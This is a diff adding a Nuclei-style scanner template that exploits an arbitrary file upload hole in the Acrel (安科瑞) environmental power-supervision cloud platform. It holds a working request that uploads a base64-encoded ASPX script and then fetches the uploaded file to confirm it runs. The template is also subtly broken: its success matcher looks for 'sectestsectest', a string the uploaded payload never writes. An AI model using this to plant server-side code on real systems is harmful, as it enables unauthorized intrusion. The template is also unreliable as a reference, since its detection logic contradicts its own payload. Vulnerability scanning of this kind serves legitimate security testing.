@@ -1,0 +1,37 @@
+id: ankerui-uploadAttachment-File-upload
+
+info:
+  name: 安科瑞环保用电监管云平台 uploadAttachment 任意文件上传漏洞
+  author: ankerui
+  severity: high
+  tags: File upload
+
+http:
+  - raw:
+      - |
+        POST /api/APP/uploadAttachment HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"FileStr":"PCVAUGFnZSBMYW5ndWFnZT0iQyMiJT48JVJlc3BvbnNlLldyaXRlKCJwYm95am5ucmZpcG1wbHN1a2RlY3p1ZHNlZnhteXdlIik7U3lzdGVtLklPLkZpbGUuRGVsZXRlKFJlcXVlc3QuUGh5c2ljYWxQYXRoKTslPg==","FileFormat":"aspx"}
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+           - '([a-zA-Z0-9]+\.aspx)'
+         internal: true
+  - raw:
+      - |
+        GET /UpLoad/Temp/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'sectestsectest'
+      - type: status
+        status: 
+          - 200
